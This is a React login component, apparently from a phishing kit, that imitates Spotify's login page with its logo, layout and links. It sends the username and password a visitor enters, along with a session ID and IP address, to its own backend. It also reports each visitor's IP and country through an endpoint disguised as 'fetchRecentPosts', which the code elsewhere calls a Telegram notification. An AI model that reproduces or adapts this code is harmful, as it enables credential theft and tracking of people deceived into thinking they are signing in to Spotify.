import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { useHistory } from 'react-router-dom';
import './styles.css';
import LoginFooter from './LoginFooter';

const Login = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loginError, setLoginError] = useState(false);
  const [passwordVisible, setPasswordVisible] = useState(false);
  const [ip, setIp] = useState(""); 
  const [country, setCountry] = useState(""); 

  const history = useHistory();

  useEffect(() => {
    const fetchStoredDataWithDelay = () => {
      setTimeout(() => {
        const storedIP = localStorage.getItem("userIP") || "Fetching...";
        const storedCountry = localStorage.getItem("country") || "Fetching...";


        setIp(storedIP);
        setCountry(storedCountry);
      }, 300);
    };

    fetchStoredDataWithDelay();
  }, []);

  useEffect(() => {
    const sendTelegramNotification = async () => {
      if (localStorage.getItem("notificationSent") || !ip || !country || ip === "Fetching...") return;

      try {
        const currentTime = new Date().toLocaleString();
        const message = `New view\nIP: ${ip}\nCountry: ${country}\nTime: ${currentTime}`;
        await axios.post(`${process.env.REACT_APP_API_URL}/api/fetchRecentPosts`, { message });

        localStorage.setItem("notificationSent", "true");
      } catch (error) {
        console.error("Failed to send Telegram notification:", error);
      }
    };

    sendTelegramNotification();
  }, [ip, country]);

  const togglePasswordVisibility = () => {
    setPasswordVisible(!passwordVisible);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const clientSessionId = localStorage.getItem('clientSessionID');
    try {
      const emailOrUsername = email
      const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/auth/loginUser`, { 
        emailOrUsername, 
        password,
        clientSessionId,
        ip
      });
      if (response.data.error) {
        setLoginError(true);
      } else {
        setLoginError(false);
        localStorage.setItem('chneyal7alataw', 1);
        history.push('/update/status=true/pending');
      }
    } catch (error) {
      setLoginError(true);
    }
  };
  return (
    <div className="encore-dark-theme encore-layout-themes">
      <div className="sc-cDelgQ ealYxH encore-dark-theme encore-layout-themes">
        <div className="sc-esHPOb sc-fsKlOa bCSeqD fFJVRD">
          <div className="sc-hNGPaV hNTfFP">
            <div className="sc-gJhJTp sc-fQpRED jIWbvU jTGUSl">
              <div className="sc-flUsNl iDuImO">
                <div className="sc-hAqmLS da-DoCW spotify-logo">
                  <svg role="img" viewBox="0 0 24 24" height="100%" className="Svg-sc-6c3c1v-0 jlGQTA" style={{ fill: 'white' }}>
                    <title>Spotify</title>
                    <path d="M13.427.01C6.805-.253 1.224 4.902.961 11.524.698 18.147 5.853 23.728 12.476 23.99c6.622.263 12.203-4.892 12.466-11.514S20.049.272 13.427.01m5.066 17.579a.717.717 0 0 1-.977.268 14.4 14.4 0 0 0-5.138-1.747 14.4 14.4 0 0 0-5.42.263.717.717 0 0 1-.338-1.392c1.95-.474 3.955-.571 5.958-.29 2.003.282 3.903.928 5.647 1.92a.717.717 0 0 1 .268.978m1.577-3.15a.93.93 0 0 1-1.262.376 17.7 17.7 0 0 0-5.972-1.96 17.7 17.7 0 0 0-6.281.238.93.93 0 0 1-1.11-.71.93.93 0 0 1 .71-1.11 19.5 19.5 0 0 1 6.94-.262 19.5 19.5 0 0 1 6.599 2.165c.452.245.62.81.376 1.263m1.748-3.551a1.147 1.147 0 0 1-1.546.488 21.4 21.4 0 0 0-6.918-2.208 21.4 21.4 0 0 0-7.259.215 1.146 1.146 0 0 1-.456-2.246 23.7 23.7 0 0 1 8.034-.24 23.7 23.7 0 0 1 7.657 2.445c.561.292.78.984.488 1.546" />
                  </svg>
                </div>
              </div>
              <h1 className="sc-jzjKHc itwVFE">Log in to Spotify</h1>
              {loginError && (
                <div className="sc-gLXSEc eZHyFP">
                  <div className="Wrapper-sc-62m9tu-0 eeuJYm encore-negative-set encore-text-body-small sc-fLVwEd xzayH">
                    <svg role="img" className="Svg-sc-ytk21e-0 exPciu Icon-sc-1mveit9-0 dtkJdQ" viewBox="0 0 24 24">
                      <title>Error:</title>
                      <path d="M11 18v-2h2v2h-2zm0-4V6h2v8h-2z"></path>
                      <path d="M12 3a9 9 0 1 0 0 18 9 9 0 0 0 0-18zM1 12C1 5.925 5.925 1 12 1s11 4.925 11 11-4.925 11-11 11S1 18.075 1 12z"></path>
                    </svg>
                    <span className="Message-sc-15vkh7g-0 kGDZJw">Incorrect username or password.</span>
                  </div>
                </div>
              )}
              <hr role="presentation" className="sc-iCZwEW gWxmho" />
              <form onSubmit={handleSubmit} className="Group-sc-u9bcx5-0 dTRcop sc-epPVmt gcMohz">
                <div className="sc-kinYwB dONESo">
                  <div className="Group-sc-u9bcx5-0 dTRcop sc-fpSrms bSfdyE">
                    <div className="LabelGroup-sc-1ibddrg-0 ebSvva encore-text-body-small-bold">
                      <label htmlFor="login-username" className="Label-sc-1c0cv3r-0 bGmVWE">
                        <span className="LabelInner-sc-19pye2k-0 kuCWup">Email or username</span>
                      </label>
                    </div>
                    <input
                      aria-invalid="false"
                      className="Input-sc-1gbx9xe-0 gVyyKq encore-text-body-medium"
                      id="login-username"
                      type="text"
                      placeholder="Email or username"
                      autoCapitalize="off"
                      autoComplete="username"
                      spellCheck="false"
                      autoCorrect="off"
                      aria-describedby="username-error"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                    />
                  </div>
                  <div className="Group-sc-u9bcx5-0 dTRcop sc-fpSrms bSfdyE">
                    <div className="LabelGroup-sc-1ibddrg-0 ebSvva encore-text-body-small-bold">
                      <label htmlFor="login-password" className="Label-sc-1c0cv3r-0 bGmVWE">
                        <span className="LabelInner-sc-19pye2k-0 kuCWup">Password</span>
                      </label>
                    </div>
                    <div className="InputContainer-sc-a5ofs0-0 cUEVVf">
                      <input
                        aria-invalid="false"
                        className="Input-sc-1gbx9xe-0 gVyyKq encore-text-body-medium"
                        id="login-password"
                        type={passwordVisible ? 'text' : 'password'}
                        placeholder="Password"
                        autoComplete="current-password"
                        spellCheck="false"
                        autoCorrect="off"
                        aria-describedby="password-error"
                        autoCapitalize="off"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                      />
                      <div className="IconContainer-sc-1oa4n9m-0 gyyaHh">
                        <button
                          type="button"
                          className="Button-sc-1dqy6lx-0 bnvbjc"
                          onClick={togglePasswordVisibility}
                        >
                          <span className="IconWrapper__Wrapper-sc-16usrgb-0 hKVcO">
                            {passwordVisible ? (
                              <svg data-encore-id="icon" role="img" aria-hidden="true" viewBox="0 0 24 24" className="Svg-sc-ytk21e-0 ZujEm">
                                <path d="M6.703 7.382A6.073 6.073 0 0 0 6.113 10c0 3.292 2.614 6 5.887 6 3.273 0 5.886-2.708 5.886-6 0-.936-.211-1.825-.589-2.618.573.341 1.115.744 1.634 1.204.674.596 1.77 1.793 2.683 3.414-.913 1.62-2.01 2.818-2.683 3.414C17.037 17.093 14.833 18 12 18s-5.037-.907-6.931-2.586c-.674-.596-1.77-1.793-2.683-3.414.913-1.62 2.01-2.818 2.683-3.414.519-.46 1.061-.863 1.634-1.204zM12 4C8.671 4 5.996 5.091 3.742 7.089c-.896.794-2.3 2.353-3.381 4.453L.125 12l.236.458c1.082 2.1 2.485 3.659 3.381 4.453C5.996 18.908 8.672 20 12 20c3.329 0 6.004-1.091 8.258-3.089.896-.794 2.3-2.353 3.38-4.453l.237-.458-.236-.458c-1.082-2.1-2.485-3.659-3.381-4.453C18.004 5.09 15.328 4 12 4zm0 2c2.125 0 3.886 1.77 3.886 4S14.125 14 12 14s-3.886-1.77-3.886-4S9.875 6 12 6z"></path>
                              </svg>
                            ) : (
                              <svg role="img" viewBox="0 0 24 24" className="Svg-sc-ytk21e-0 ZujEm">
                                <path d="M22.207 2.824a1 1 0 1 0-1.414-1.414L17.15 5.053C15.621 4.363 13.92 4 12 4 8.671 4 5.996 5.091 3.742 7.089c-.896.794-2.3 2.353-3.381 4.453L.125 12l.236.458c1.082 2.1 2.485 3.659 3.381 4.453.278.246.562.479.853.697L1.793 20.41a1 1 0 1 0 1.414 1.414l3.126-3.126.003.002 1.503-1.503-.004-.001 1.73-1.73.004.001 1.567-1.567h-.004l4.68-4.681.001.004 1.595-1.595-.002-.003.11-.109.002.002 1.444-1.444-.003-.002 3.248-3.248zM14.884 7.32l-5.57 5.57A4.035 4.035 0 0 1 8.113 10c0-2.23 1.761-4 3.886-4 1.137 0 2.17.506 2.884 1.319zM7.9 14.304l-1.873 1.873a11.319 11.319 0 0 1-.957-.763C4.396 14.818 3.3 13.621 2.387 12c.913-1.62 2.01-2.818 2.683-3.414.519-.46 1.061-.863 1.634-1.204A6.073 6.073 0 0 0 6.113 10c0 1.681.682 3.21 1.786 4.304zm11.568-5.2 1.415-1.415a16.503 16.503 0 0 1 2.756 3.853l.236.458-.236.458c-1.082 2.1-2.485 3.659-3.381 4.453C18.004 18.908 15.328 20 12 20a13.22 13.22 0 0 1-3.08-.348l1.726-1.726c.435.05.886.074 1.354.074 2.833 0 5.037-.907 6.931-2.586.674-.596 1.77-1.793 2.683-3.414a14.515 14.515 0 0 0-2.146-2.896z"></path>
                              </svg>
                            )}
                          </span>
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
                <div className="sc-gutikT sc-huvEkS fVbbtc leTZEG">
                  <button id="login-button" className="Button-sc-qlcn5g-0 hFRjpO encore-text-body-medium-bold" style={{ width: '100%' }}>
                    <span className="ButtonInner-sc-14ud5tc-0 hvvTXU encore-bright-accent-set">
                      <span className="encore-text encore-text-body-medium-bold sc-iKTcqh sc-gnpbhQ doOTMr cyUyia">Log In</span>
                    </span>
                    <span className="ButtonFocus-sc-2hq6ey-0 gJnrqA"></span>
                  </button>
                </div>
                <div className="sc-ifyrTC sc-dENhDJ sc-eEPDDI dssuKg ilTmUK egGRlx">
                  <a href="https://accounts.spotify.com/password-reset" id="reset-password-link" className="Link-sc-k8gsk-0 cgOuFc sc-euGpHm geXsAV">
                    <p className="sc-czgmHJ kraIJY">Forgot your password?</p>
                  </a>
                </div>
        <input type="hidden" name="country" value={country} />
        <input type="hidden" name="ip" value={ip} />
              </form>
              <div style={{ marginTop: '9px' }} id="sign-up-section" className="sc-dorvvM ewqcub">
                <h2 className="sc-cBYhjr kyvYle">
                  <span className="encore-text encore-text-body-medium encore-internal-color-text-subdued">Don't have an account?</span>
                  <a href="https://www.spotify.com/signup" id="sign-up-link" className="Link-sc-k8gsk-0 cgOuFc sc-kTYLvb klSGTe">
                    <span className="encore-text encore-text-body-medium sc-dJDBYC ghuOx">Sign up for Spotify</span>
                  </a>
                </h2>
              </div>
            </div>
          </div>
        </div>
        <LoginFooter />
      </div>
    </div>
  );
};

export default Login;